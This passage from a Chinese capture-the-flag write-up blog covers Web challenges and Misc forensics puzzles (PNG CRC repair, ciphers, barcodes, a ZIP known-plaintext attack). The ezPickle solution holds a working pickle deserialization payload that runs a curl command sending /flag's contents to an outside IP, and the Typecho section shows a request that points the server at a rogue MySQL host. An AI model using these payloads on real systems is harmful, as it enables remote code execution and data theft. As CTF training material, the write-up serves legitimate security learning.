class="variable">$s</span>, <span class="variable">$len</span>);</span><br><span class="line">      <span class="variable">$len</span> -= strlen(<span class="variable">$chunk</span>);</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$chunk</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">  fclose(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行上述脚本，然后抓包将提交的数据中的数据库适配器改为 Mysqli，具体修改如下。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbAdapter=Mysqli&amp;dbHost=8.136.8.210&amp;dbPort=10026&amp;dbUser=root&amp;dbPassword=root&amp;dbDatabase=typecho&amp;dbCharset=utf8&amp;dbPrefix=typecho_&amp;userUrl=http%3A%2F%2F121.36.229.59%3A32767&amp;userName=admin&amp;userPassword=&amp;userMail=webmaster%40yourdomain.com&amp;action=config</span><br></pre></td></tr></table></figure><p>发送修改后的请求可以在恶意服务器中得到 flag。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635087196655263/b33ece5c1eaf5cf2fca3f4a20609d20d298dfe61.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;HpQYP8Z6wRgb2pPLwVOupVRM71zwkKOG&#125;</span><br></pre></td></tr></table></figure><h3 id="ezPickle"><a href="#ezPickle" class="headerlink" title="ezPickle"></a>ezPickle</h3><blockquote><p>一个简单的pickle反序列化</p></blockquote><p>附件中给出的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template_string, url_for,redirect</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    info = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        x = base64.b64decode(info)</span><br><span class="line">        User = restricted_loads(x)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>可以发现此时存在一个 Pickle 反序列化的漏洞，同时在 config.py 中有如下内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">notadmin=&#123;<span class="string">&quot;admin&quot;</span>:<span class="string">&quot;no&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> notadmin[<span class="string">&quot;admin&quot;</span>]==<span class="string">&quot;yes&quot;</span>:</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">eval</span>(s)</span><br></pre></td></tr></table></figure><p>因此首先需要修改 notadmin 的值，将 admin 的值改为 yes，然后调用到 backdoor 进行 RCE 以读取 flag。</p><blockquote><p><a href="https://xz.aliyun.com/t/8342">https://xz.aliyun.com/t/8342</a></p></blockquote><p>写出如下脚本来带出 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> httpx <span class="keyword">as</span> requests</span><br><span class="line">session = requests.Client(base_url=<span class="string">&quot;http://124.71.183.254:32770/&quot;</span>, timeout=<span class="number">2</span>)</span><br><span class="line">data = <span class="string">b&quot;&quot;&quot;cconfig</span></span><br><span class="line"><span class="string">notadmin</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">S&quot;yes&quot;</span></span><br><span class="line"><span class="string">s0(S&quot;__import__(&#x27;os&#x27;).system(&#x27;curl http://8.136.8.210:3255/?flagIs-$(cat /flag | base64)&#x27;)&quot;</span></span><br><span class="line"><span class="string">iconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">session.get(<span class="string">&quot;/&quot;</span>, params=&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: base64.b64encode(data).decode()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>运行上述脚本即可在监听端收到包含 flag 的请求。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635093445316256/4fcc3e26c9a2d25d26190d90b9de9594845202e4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5tZhq4DRETNb77g0PfxNkzsmQizSI8jV&#125;</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="WeirdPhoto"><a href="#WeirdPhoto" class="headerlink" title="WeirdPhoto"></a>WeirdPhoto</h3><blockquote><p>奇奇怪怪的图片？</p></blockquote><p>使用 010 Editor 打开图片可以得到如下报错。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ERROR: CRC Mismatch @ chunk[0]; in data: 9e916964; expected: ae28072d</span><br></pre></td></tr></table></figure><p>使用脚本爆破一下 CRC 修复图片可以得到下图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&quot;1.png&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">        data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, j)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span>(crc32 == <span class="number">0x9E916964</span>):</span><br><span class="line">            <span class="built_in">print</span>(i, j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;hex:&#x27;</span>, <span class="built_in">hex</span>(i), <span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094516031720/8d3db7f55060968a0959b3b00c17bac821029d9c.png"></p><p>将图片中的信息提取出来，使用<a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">千千秀字的栅栏密码在线解密工具</a>可以解出信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TIEWOFTHSAEOUIITNRBCOSHSTSAN</span><br></pre></td></tr></table></figure><p>当每组字数设定为 4 时可以成功解码。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094537679360/8ca18effabf83062b5e8f37f86f2670fdc4cfbbd.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THISISTHEANSWERTOOBSFUCATION</span><br></pre></td></tr></table></figure><p>将所得的信息作为压缩包密码解压 out.zip 可得 pdf 文档。将其文件头修复为 25 50 44 46 后观察其文件名，尝试使用工具 WbStego4.3 进行加密信息提取，使用空密码解密即可得到 flag 文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;th1s_ls_thE_f1n4l_F14g_y0u_want&#125;</span><br></pre></td></tr></table></figure><h3 id="mirror"><a href="#mirror" class="headerlink" title="mirror"></a>mirror</h3><blockquote><p>find the answer in the mirror</p><p>2-5 e-6 9-a p-b q-d</p></blockquote><p>使用 010 Editor 打开附件中所给的图片，可以发现如下报错。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ERROR: CRC Mismatch @ chunk[0]; in data: 099b2f6e; expected: 8963994a</span><br></pre></td></tr></table></figure><p>进行爆破后修复图片高度为 0x505。在图片的尾部可以发现可疑字符，其中含有反写的 PNG 尾。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094564235600/7a5f44bb70118c6db25cba11cdf869621d1f98b6.png"></p><p>仔细观察可以发现这是一张完整的 PNG 图片被从尾部开始倒序逐行存储所得的二进制文件，将这部分提取出来，写一个脚本将其复原。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;ext&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(file), <span class="number">16</span>):</span><br><span class="line">    data.append(file[x:x + <span class="number">16</span>])</span><br><span class="line">data.reverse()</span><br><span class="line">data = <span class="string">b&quot;&quot;</span>.join(data)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;extrev.png&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(data)</span><br></pre></td></tr></table></figure><p>然后将其高度修复为 0x505，即可得到两张看似一样的图。尝试使用基于 Python 实现的盲水印可得到如下图片。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094597313321/a801e9ec2fd38feefb0b928b76f3fc63304c9ab7.png"></p><p>将图片稍作处理后可读出如下信息。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094582085101/2be94be205025e174e99f21eab87e769382ba36b.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32effq8aa8374a02a9p1636ae8901qa0</span><br></pre></td></tr></table></figure><p>根据提示将部分字符转写，写出如下语句来实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">a = string.maketrans(<span class="string">&quot;2e9pq56abd&quot;</span>, <span class="string">&quot;56abd2e9pq&quot;</span>)</span><br><span class="line"><span class="string">&quot;32effq8aa8374a02a9p1636ae8901qa0&quot;</span>.translate(a)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094652525803/a3c905023a9c05a44082ceacef35a90a5f861f92.png"></p><p>即可得出正确的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;356ffd89983749059ab1e3e968a01d90&#125;</span><br></pre></td></tr></table></figure><h3 id="bar"><a href="#bar" class="headerlink" title="bar"></a>bar</h3><blockquote><p>熟悉的bar</p><p>flag格式为flag{xxxxx}</p><p>1、观察得到字符串在code93在线网站生成的条形码停止字符的前两位字符 2、flag内容都是小写英文字母</p></blockquote><p>使用 GIFSplitter 分离动图得到若干静态图片，可以观察到其中有灰色的块。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094680364968/ae894e78365badb3ff3cfd19711a13bb3ca7ea4d.png"></p><p>假定灰色的块为分隔符，黑色的块为 1 而白色的块为 0，可以将灰色块分割的部分划分成如下信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1010 111 100 0 11110 00011</span><br></pre></td></tr></table></figure><p>将其看作以 1 为 -，以 0 为 . 的摩斯电码可得 CODE93 的提示，因此按照相关的标准写脚本将其数据区的数据读出，然后算出校验码。</p><blockquote><p><a href="https://www.activebarcode.com/codes/checkdigit/modulo47.html">https://www.activebarcode.com/codes/checkdigit/modulo47.html</a></p><p><a href="http://www.appsbarcode.com/sc20130113/Code%2093.php">http://www.appsbarcode.com/sc20130113/Code%2093.php</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">chart = &#123;<span class="string">&quot;100010100&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101001000&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101000100&quot;</span>: <span class="string">&quot;2&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101000010&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100101000&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100100100&quot;</span>: <span class="string">&quot;5&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100100010&quot;</span>: <span class="string">&quot;6&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101010000&quot;</span>: <span class="string">&quot;7&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100010010&quot;</span>: <span class="string">&quot;8&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100001010&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110101000&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110100100&quot;</span>: <span class="string">&quot;B&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110100010&quot;</span>: <span class="string">&quot;C&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110010100&quot;</span>: <span class="string">&quot;D&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110010010&quot;</span>: <span class="string">&quot;E&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110001010&quot;</span>: <span class="string">&quot;F&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101101000&quot;</span>: <span class="string">&quot;G&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101100100&quot;</span>: <span class="string">&quot;H&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101100010&quot;</span>: <span class="string">&quot;I&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100110100&quot;</span>: <span class="string">&quot;J&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100011010&quot;</span>: <span class="string">&quot;K&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101011000&quot;</span>: <span class="string">&quot;L&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101001100&quot;</span>: <span class="string">&quot;M&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101000110&quot;</span>: <span class="string">&quot;N&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100101100&quot;</span>: <span class="string">&quot;O&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100010110&quot;</span>: <span class="string">&quot;P&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110110100&quot;</span>: <span class="string">&quot;Q&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110110010&quot;</span>: <span class="string">&quot;R&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110101100&quot;</span>: <span class="string">&quot;S&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110100110&quot;</span>: <span class="string">&quot;T&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110010110&quot;</span>: <span class="string">&quot;U&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110011010&quot;</span>: <span class="string">&quot;V&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101101100&quot;</span>: <span class="string">&quot;W&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101100110&quot;</span>: <span class="string">&quot;X&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100110110&quot;</span>: <span class="string">&quot;Y&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100111010&quot;</span>: <span class="string">&quot;Z&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100101110&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">         <span class="string">&quot;111010100&quot;</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">         <span class="string">&quot;111010010&quot;</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">         <span class="string">&quot;111001010&quot;</span>: <span class="string">&quot;$&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101101110&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">         <span class="string">&quot;101110110&quot;</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110101110&quot;</span>: <span class="string">&quot;%&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100100110&quot;</span>: <span class="string">&quot;$&quot;</span>,</span><br><span class="line">         <span class="string">&quot;111011010&quot;</span>: <span class="string">&quot;%&quot;</span>,</span><br><span class="line">         <span class="string">&quot;111010110&quot;</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100110010&quot;</span>: <span class="string">&quot;+&quot;</span>,</span><br><span class="line">         <span class="string">&quot;000000000&quot;</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">         <span class="string">&quot;101011110&quot;</span>: <span class="string">&quot;*&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>, <span class="number">334</span>):</span><br><span class="line">    data += <span class="string">&quot;0&quot;</span> <span class="keyword">if</span> Image.<span class="built_in">open</span>(<span class="string">f&quot;./d/IMG<span class="subst">&#123;x:05d&#125;</span>.bmp&quot;</span>).getpixel((<span class="number">0</span>, <span class="number">0</span>)) == (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>) <span class="keyword">else</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data) - <span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    result += chart[data[x: x + <span class="number">9</span>]]</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line">checkIndex = <span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-. $/+%$%/+*&quot;</span></span><br><span class="line">result = result[<span class="number">1</span>:-<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">loop = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">21</span>)]</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result)):</span><br><span class="line">    price = loop[(<span class="built_in">len</span>(result) - x - <span class="number">1</span>) % <span class="number">20</span>]</span><br><span class="line">    c += checkIndex.index(result[x]) * price</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;*<span class="subst">&#123;c % <span class="number">47</span>&#125;</span>*&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;*<span class="subst">&#123;checkIndex[c % <span class="number">47</span>]&#125;</span>*&quot;</span>)</span><br><span class="line"></span><br><span class="line">loop = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">16</span>)]</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">result += checkIndex[c % <span class="number">47</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result)):</span><br><span class="line">    price = loop[(<span class="built_in">len</span>(result) - x - <span class="number">1</span>) % <span class="number">15</span>]</span><br><span class="line">    k += checkIndex.index(result[x]) * price</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;*<span class="subst">&#123;k % <span class="number">47</span>&#125;</span>*&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;*<span class="subst">&#123;checkIndex[k % <span class="number">47</span>]&#125;</span>*&quot;</span>)</span><br><span class="line">result += checkIndex[k % <span class="number">47</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;*<span class="subst">&#123;result&#125;</span>*&quot;</span>)</span><br></pre></td></tr></table></figure><p>运行脚本可以得出结果为 F0C62DB973684DBDA896F9C5F6D962W&lt;SPACE&gt;，其中 W 和 &lt;SPACE&gt; 分别为校验码 C 和 K。根据提示可知需要小写的条码，因此用 f0c62db973684dbda896f9c5f6d962 重新生成条码。（这个地方出题人也许没读清楚条码规范，小写字母应该要前导控制码表示的。）</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094843401477/1cdfe3463f24dd1029932c5f1c11a756863f4655.png"></p><p>将其中的校验码读出如下。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">110010110 101001100</span><br></pre></td></tr></table></figure><p>对照码表可以读出 UM，转化为小写为 um，将其与原本的字符串拼接即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f0c62db973684dbda896f9c5f6d962um&#125;</span><br></pre></td></tr></table></figure><h3 id="BlueWhale"><a href="#BlueWhale" class="headerlink" title="BlueWhale"></a>BlueWhale</h3><blockquote><p>好多流量！</p></blockquote><p>使用 7-zip 解压附件时报出了警告错误，但是不影响解压。之后用 WireShark 对流量包进行分析，跟踪 TCP 流到 5 可以发现如下信息。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094763955049/fc6e9fbdc6d03a10e0e5eae40e5397a161d919f1.png"></p><p>将密码 th1sIsThEpassw0rD 记下。在附件给出的加密压缩包中可以发现 password.txt 的 CRC 校验为 8CA352BA，同时其大小为 17，其压缩算法为 Deflate。尝试将上述得到的密码写入文本文档后采用相同算法压缩可以发现其 CRC 校验码跟加密压缩包中的 password.txt 的 CRC 校验码一致，因此尝试使用明文攻击。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/63a00f26-6ebf-45c5-b60f-5101a333f96f/1635094823176671/a56798d5d809911cf29143910d3df10f560ab278.png"></p><p>使用 ARCHPR 进行明文攻击后可以保存包含加密压缩包中的图片的未加密压缩包，将图片解压后使用 zsteg 解隐写可以得到如下信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1,rgb,lsb,xy .. text: &quot;flag&#123;F1nallY_y0uve_f0unD_1t&#125;&quot;</span><br></pre></td></tr></table></figure><p>因此得出正确的 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;F1nallY_y0uve_f0unD_1t&#125;</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lemonprefect.cn/zh-CN/posts/3c25c4ac.html#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ByteCTF 2021</title>
      <link>https://lemonprefect.cn/zh-CN/posts/611b2d51.html</link>
      <guid>https://lemonprefect.cn/zh-CN/posts/611b2d51.html</guid>
      <pubDate>Fri, 15 Oct 2021 09:16:00 GMT</pubDate>
      
        
        
          
          
